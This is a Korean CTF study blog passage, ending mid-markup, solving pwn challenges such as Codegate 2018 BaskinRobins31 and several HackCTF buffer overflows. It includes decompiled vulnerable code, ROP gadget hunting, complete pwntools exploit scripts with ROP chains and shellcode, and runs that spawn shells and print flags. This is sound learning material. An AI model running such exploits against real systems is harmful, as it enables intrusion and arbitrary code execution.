title="PWN D+4 (2021.01.28)"></a>PWN D+4 (2021.01.28)<br></h2><hr><p>Codagate 2018 Challenge : BaskinRobins31</p><p><strong>오늘은 64 Bit ROP 익스를 공부하고, 좀 쉬운 문제가 없나 보다가 코게 2018에서 나온 BaskinRobins31라는 문제가 있어 풀어보겠습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ checksec --file&#x3D;BaskinRobins31</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83) Symbols  No03BaskinRobins31</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ </span><br></pre></td></tr></table></figure><p><strong>checksef을 이용해서 보호 기법을 확인해보니 RELRO와 NX Bit가 걸려있는 것을 볼 수 있습니다. NX Bit를 우회하기 위해 ROP를 이용해 익스를 진행하면 될 거 같고, Partial RELRO이기 때문에 GOT Overwrite가 가능합니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  _BOOL4 v6; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v5 = <span class="number">31</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;### This game is similar to the BaskinRobins31 game. ###&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;### The one that take the last match win ###&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;There are %u number(s)\n&quot;</span>, <span class="number">31LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      my_turn(&amp;v5);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (<span class="keyword">unsigned</span> __int64)your_turn(&amp;v5) != <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;remaining number(s) : %i \n&quot;</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wow! You win!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hint is : ROP&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You lose!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 while 문 안에 v6의 값이 참이 아니면 else 문으로 들어가 your_turn 함수를 호출하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">your_turn</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">size_t</span> n; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x96</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers do you want to take ? (1-3)&quot;</span>);</span><br><span class="line">  n = read(<span class="number">0</span>, &amp;s, <span class="number">0x190</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, &amp;s, n);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  v4 = strtoul(&amp;s, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_decision((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(<span class="keyword">char</span>)v4, <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 -= v4;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Don&#x27;t break the rules...:( &quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>your_turn 함수를 보면 read 함수를 이용해서 s 값을 입력 받고, write 함수를 이용해서 출력해주는 것을 볼 수 있습니다. 하지만 s는 memset 함수를 이용해서 150 사이즈만큼 초기화 시켜주는데 read 함수에서는 400만큼 입력을 받고 있어 BOF 취약점이 발생합니다. RET까지 덮을려면 s[176] + sfp[8]만큼 덮어주면 됩니다. 이제 가젯들을 구해보겠습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ objdump -d BaskinRobins31 | grep -B4 &quot;ret&quot;</span><br><span class="line">(생략)</span><br><span class="line">--</span><br><span class="line">  400877:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  40087a:5f                   pop    %rdi</span><br><span class="line">  40087b:5e                   pop    %rsi</span><br><span class="line">  40087c:5a                   pop    %rdx</span><br><span class="line">  40087d:c3                   retq   </span><br><span class="line">  40087e:90                   nop</span><br><span class="line">  40087f:5d                   pop    %rbp</span><br><span class="line">  400880:c3                   retq   </span><br><span class="line">--</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>objdump를 이용해서 가젯을 찾아보니 pop pop pop ret 가젯을 있는 것을 확인할 수 있습니다. 그리고 system 함수에서 사용할 pop ret 가젯도 그냥 pppr 가젯에서 2를 더한 것을 사용하려 했는데 이를 이용하니 잘 되지 않았습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ ropsearch &quot;pop rdi&quot;</span><br><span class="line">Searching for ROP gadget: &#39;pop rdi&#39; in: binary ranges</span><br><span class="line">0x00400bc3 : (b&#39;5fc3&#39;)pop rdi; ret</span><br><span class="line">0x0040087a : (b&#39;5f5e5ac3&#39;)pop rdi; pop rsi; pop rdx; ret</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p><strong>그래서 ropsearch 명령어를 이용해서 pop rdi; ret 가젯을 찾아서 이를 이용했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ objdump -h BaskinRobins31 </span><br><span class="line"></span><br><span class="line">BaskinRobins31:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">(생략)</span><br><span class="line"> 25 .bss          00000020  0000000000602090  0000000000602090  00002088  2**4</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>마지막으로 objdump를 이용해서 bss를 구했습니다. 나머지 got/plt/offset은 pwntools를 이용해서 구할 수 있습니다.</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 이용해서 read 주소를 릭하고, 이를 이용해서 libc_base를 구한다.</li><li>read 함수를 이용해서 bss에 쉘을 넣어준다.</li><li>read 함수를 이용해서 read got를 system 함수로 체이닝 해준다.</li><li>read 함수를 호출하고, 이때 인자로는 bss를 넘겨준다. bss에는 <code>/bin/sh</code>가 들어있다.<br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./BaskinRobins31&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&quot;./BaskinRobins31&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read_offset = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt = e.plt[<span class="string">&#x27;read&#x27;</span>] </span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss = e.bss()</span><br><span class="line">pppr = <span class="number">0x40087a</span></span><br><span class="line">pr = <span class="number">0x00400bc3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;pppr : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pppr)))</span><br><span class="line">log.info(<span class="string">&#x27;bss : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss)))</span><br><span class="line">log.info(<span class="string">&#x27;read_plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;read_got : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_got)))</span><br><span class="line">log.info(<span class="string">&#x27;write_plt : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(write_plt)))</span><br><span class="line">log.info(<span class="string">&#x27;system_offset : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_offset)))</span><br><span class="line">log.info(<span class="string">&#x27;read_offset : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_offset)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># BOF</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">184</span> <span class="comment"># Buffer + SFP</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Channing</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(1, read_got, 8);</span></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pppr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">payload += p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;(1-3)\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = leak - read_offset</span><br><span class="line">system = libc_base + system_offset</span><br><span class="line">log.info(<span class="string">&#x27;libc_base : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.info(<span class="string">&#x27;system : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system)))</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.sendline(p64(system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 이것 저것 확인한다고, 좀 지져분함.</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31$ python exploit.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;BaskinRobins31&#39;: pid 16607</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;pocas&#x2F;pwn&#x2F;codegate&#x2F;2018&#x2F;BaskinRobins31&#x2F;BaskinRobins31&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] pppr : 0x40087a</span><br><span class="line">[*] bss : 0x602090</span><br><span class="line">[*] read_plt : 0x400700</span><br><span class="line">[*] read_got : 0x602040</span><br><span class="line">[*] write_plt : 0x4006d0</span><br><span class="line">[*] system_offset : 0x4f550</span><br><span class="line">[*] read_offset : 0x110140</span><br><span class="line">[*] libc_base : 0x7f621a53c000</span><br><span class="line">[*] system : 0x7f621a58b550</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x00$ ls</span><br><span class="line">BaskinRobins31    exploit.py  flag</span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;The Korean name of &quot;Puss in boots&quot; is &quot;My mom is an alien&quot;&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : flag{The Korean name of “Puss in boots” is “My mom is an alien”}</p></blockquote><hr><h2 id="PWN-D-5-2021-01-29"><a href="#PWN-D-5-2021-01-29" class="headerlink" title="PWN D+5 (2021.01.29)"></a>PWN D+5 (2021.01.29)<br></h2><hr><p>HackCTF Challenge : 내 버퍼가 흘러넘친다!!!</p><p><strong>이번에는 BOF 취약점을 이용해서 쉬운 쉘 코드 관련 문제를 하나 풀어보겠습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input : &quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 s 변수를 14h 만큼 생성해주고, read 함수를 이용해서 name을 입력 받고, printf 함수로 출력하고, 또 gets 함수를 이용해서 s를 입력 받는 것을 볼 수 있습니다. 여기서 gets 함수로 입력값을 받고, 입력값의 대한 검증이 없기 때문에 BOF 취약점이 발생합니다. 그래서 그냥 name 변수에 쉘코드를 넣어주고, RET 값으로 name의 주소를 주면 된다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x080484f4 &lt;+41&gt;:push   0x804a060</span><br><span class="line">0x080484f9 &lt;+46&gt;:push   0x0</span><br><span class="line">0x080484fb &lt;+48&gt;:call   0x8048370 &lt;read@plt&gt;</span><br></pre></td></tr></table></figure><p><strong>gdb를 이용해서 name의 주소가 0x804a060라는 것을 알 수 있습니다..</strong><br></p><ul><li>시나리오</li></ul><ol><li>name 변수에 쉘 코드를 입력해준다. 쉘 코드는 그냥 검색해서 구했다.</li><li>BOF 취약점을 이용해서 RET를 name의 주수로 덮어준다.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3003</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Name : &quot;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">24</span></span><br><span class="line">payload += p32(<span class="number">0x804a060</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input : &quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python prob.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3003: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;1_l0v3_70p_pwn3r_m4lhyuk&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{1_l0v3_70p_pwn3r_m4lhyuk}</p></blockquote><hr><p>HackCTF Challenge : x64 Buffer Overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s, envp);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>코드를 보면 scanf 함수를 이용해서 s를 입력 받고 있습니다. 하지만 길이에 대한 검증이 없어 BOF 취약점이 발생합니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callMeMaybe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *path; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  path = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">  v2 = <span class="string">&quot;-p&quot;</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/bash&quot;</span>, &amp;path, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>그리고 다른 함수가 뭐가 있나 보니 callMeMaybe라는 함수가 존재했습니다. 해당 함수를 실행시키면 execve 함수를 이용해서 쉘을 실행 시키는 것을 볼 수 있습니다. 그러니 BOF 취약점을 이용해서 RET를 ccallMeMaybe 함수의 주소로 덮으면 될 거 같습니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;ctf.j0n9hyun.xyz&quot;</span>, <span class="number">3004</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x400606</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">280</span></span><br><span class="line">payload += p64(shell_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;HackCTF$ python 64bof_basic.py </span><br><span class="line">[+] Opening connection to ctf.j0n9hyun.xyz on port 3004: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">HackCTF&#123;64b17_b0f_15_51mpl3_700&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : HackCTF{64b17_b0f_15_51mpl3_700}</p></blockquote><hr><p>HackCTF Challenge : x64 Simple_size_BOF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td 